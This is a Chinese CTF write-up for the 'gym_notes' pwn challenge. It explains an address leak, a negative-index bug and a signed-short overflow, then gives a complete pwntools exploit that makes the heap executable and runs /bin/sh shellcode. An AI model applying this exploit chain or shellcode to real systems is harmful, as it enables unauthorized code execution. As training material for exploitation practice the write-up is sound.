# gym_notes
题目给出了代码，其中`delNote`可以泄露代码段基地址
```c
void delNote() {
  printf("Function 0x%lx isn't implemented yet..\n", (void*)delNote);
}
```
然后这里仍然存在逻辑漏洞

```c
...
  option++; 
  if(option < 0 || option > lastNoteIndex) {
    printf("Note not found..\n");
    return;
  }
...
```
这里的option我们可以提交为-1, 这样就能修改初始example快
然后仍然存在一个整数溢出漏洞
```c
...
  short nread; 

  printf("Write a note (max. %d characters)\n", MAX_NOTE_SIZE);
  printf("> \n");
  nread = getline(&line, &len, stdin);

  if(nread >= MAX_NOTE_SIZE) {
    printf("Too many characters, adding note failed..\n");
    return;
  }
...
```
可以看到这里的short是有符号的，因此如果我们getline传入的参数大于0x7ffff,则返回的nread就变成了一个负数，这样导致就存在一个任意地址写,但是注意不能包含`\x00`

然后后面直接修改存在堆上的函数列表,调用危险函数修改heap段为rwx,然后在上面写一个`0x18`大小的shellcode最后getshell

exp如下
```python

from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'DEBUG')
context.terminal = ['tmux','splitw','-h']

def slog(name, address): print("\033[40;34m[+]\033[40;35m" + name + "==>" +hex(address) + "\033[0m")

def debug(cmd = 0):
    if cmd == 0:
        gdb.attach(io)
    else:
        gdb.attach(io, cmd)

s   = lambda content : io.send(content)
sl  = lambda content : io.sendline(content)
sa  = lambda content,send : io.sendafter(content, send)
sla = lambda content,send : io.sendlineafter(content, send)
rc  = lambda number : io.recv(number)
ru  = lambda content : io.recvuntil(content)
rcl = lambda : io.recvline()

def show(index):
    sla("> \n", "1")
    sla("> \n", str(index))

def add(content):
    sla("> \n", "2")
    sla("> \n", content)

def delete():
    sla("> \n", "3")

def edit(index, content):
    sla("> \n", "4")
    sla("> \n", str(index))
    sla("> \n", content)

io = process('./gym_notes')
elf = context.binary = ELF('./gym_notes')
delete()
ru("0x")
elf.address += int(rc(12),16) - elf.symbols['delNote']
slog("allowFunctionsExec", elf.symbols['allowFunctionsExec'])

payload = b'a'*1000
edit(-1, payload)

indexOffset = 8
print('cyclic %d' % cyclic_find('biha'))

# overwrite the add_func
payload = flat(
        b'\x01'*0xd68,
        elf.symbols['allowFunctionsExec']
)
# make short to negative number
payload +=((2**15) - len(payload))*b'\x00'
edit(-1, payload)
# set heap excutable
add('got it!')

ru('0x')
heap_rwx = int(rc(12),16) 
slog("heap", heap_rwx)

shellcode = b'\x90\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05'

payload = flat(
        b'\x01'*0xd60,
        shellcode,
        heap_rwx+1          # strcpy cannot be none
)
payload +=((2**15) - len(payload))*b'\x00'
edit(-1, payload)
sla("> \n", "4")
io.interactive()
```

